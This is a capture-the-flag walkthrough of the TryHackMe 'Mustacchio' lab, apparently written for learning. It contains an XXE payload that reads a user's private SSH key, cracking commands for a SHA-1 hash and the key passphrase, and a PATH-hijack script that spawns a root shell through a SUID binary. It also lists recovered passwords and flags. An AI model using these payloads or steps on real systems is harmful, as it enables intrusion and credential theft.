# Mustacchio — TryHackMe Writeup

> **Difficulty:** Easy  
> **Tags:** XXE, SUID, PATH Hijacking, SHA-1 Cracking  
> **Platform:** TryHackMe

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -O -A -p- 10.66.182.152
```

Three open ports discovered:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80   | HTTP    | Apache httpd 2.4.18 (Ubuntu) |
| 8765 | HTTP    | nginx 1.10.3 (Ubuntu) |

- **Port 80** serves a static website "Mustacchio | Home"
- **Port 8765** hosts an admin login panel "Mustacchio | Login"

### Directory Enumeration

```bash
gobuster dir -u http://10.66.182.152:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,zip,js
```

Notable findings on port 80:

- `/custom/` — directory listing enabled, contains `css/` and `js/`
- `/robots.txt`
- Standard HTML pages: `index.html`, `about.html`, `blog.html`, `gallery.html`, `contact.html`

Port 8765 enumeration:

```bash
gobuster dir -u http://10.66.182.152:8765 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,xml
```

- `/index.php` — login page
- `/home.php` — admin panel (302 redirects to login if unauthenticated)
- `/auth/` — authentication directory
- `/assets/` — static assets

---

## Initial Access

### Step 1: Database Backup Discovery

Browsing the `/custom/js/` directory on port 80 revealed a `users.bak` file containing:

```
admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

This is a username `admin` with a **SHA-1** hash (40 hex characters).

### Step 2: Hash Cracking

```bash
echo "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" > hash.txt
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** `bulldog19`

### Step 3: Admin Panel Login

Logged into the admin panel at `http://10.66.182.152:8765/` with `admin:bulldog19`.

The admin panel (`home.php`) revealed critical information:

1. **XML input field** — a textarea accepting XML for "adding comments", with JavaScript validation: `"Insert XML Code!"`
2. **HTML comment** — `<!-- Barry, you can now SSH in using your key!-->` — user `barry` has an SSH key
3. **Commented-out cookie** — `//document.cookie = "Example=/auth/dontforget.bak";` — points to an XML template backup

### Step 4: XML Template Discovery

```bash
curl -s http://10.66.182.152:8765/auth/dontforget.bak
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

This confirmed the expected XML structure: `<comment>` → `<name>`, `<author>`, `<com>`.

### Step 5: XXE — Extracting Barry's SSH Key

Submitted the following payload in the admin panel textarea:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>&xxe;</com>
</comment>
```

The server parsed the XML and rendered Barry's private SSH key in the comment preview section.

### Step 6: SSH Key Cracking

The key was encrypted (AES-128-CBC). Extracted the hash and cracked the passphrase:

```bash
python3 /usr/share/john/ssh2john.py barry_rsa > barry_hash
john barry_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** `urieljames`

### Step 7: SSH as Barry

```bash
chmod 600 barry_rsa
ssh -i barry_rsa barry@10.66.182.152
# Passphrase: urieljames
```

```bash
cat ~/user.txt
# 62d77a4d5f97d47c5aa38b3b2651b831
```

---

## Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard SUID binaries, one stood out:

```
/home/joe/live_log
```

Owned by **root**, SUID bit set — a custom binary in a user's home directory.

### Binary Analysis

```bash
file /home/joe/live_log
# ELF 64-bit LSB shared object, x86-64, not stripped

strings /home/joe/live_log
```

Key findings in `strings` output:

```
system@@GLIBC_2.2.5
tail -f /var/log/nginx/access.log
```

The binary calls `system()` with a **relative path** to `tail` (not `/usr/bin/tail`). Since `system()` spawns a shell which resolves commands via `$PATH`, this is exploitable through **PATH hijacking**.

### PATH Hijacking

```bash
cd /tmp
echo '#!/bin/bash' > tail
echo '/bin/bash -p' >> tail
chmod +x tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

The `-p` flag preserves the effective UID (root) from the SUID bit.

```bash
whoami
# root

cat /root/root.txt
# 3223581420d906c4dd1a5f9b530393a5
```

---

## Attack Chain Summary

```
Port 80 static site
  └─ /custom/js/users.bak → admin SHA-1 hash
      └─ Cracked: bulldog19
          └─ Login to admin panel (port 8765)
              └─ /auth/dontforget.bak → XML structure
                  └─ XXE: file:///home/barry/.ssh/id_rsa
                      └─ ssh2john + john → passphrase: urieljames
                          └─ SSH as barry → user.txt
                              └─ SUID /home/joe/live_log
                                  └─ system("tail ...") → PATH hijack → root
```

---

## Key Takeaways

- **Always enumerate file contents in discovered directories** — `users.bak` was sitting in a publicly accessible `/custom/js/` folder
- **Read source code carefully** — HTML comments and commented-out JavaScript revealed the SSH user and the XML backup path
- **XXE is powerful for file exfiltration** — when an application parses XML input, always test for external entity injection
- **SUID + `system()` + relative path = PATH hijacking** — use `strings` to identify imported functions (`system@@GLIBC`) and relative command calls; `system()` spawns a shell that resolves via `$PATH`, while `execve()` with an absolute path would not be vulnerable
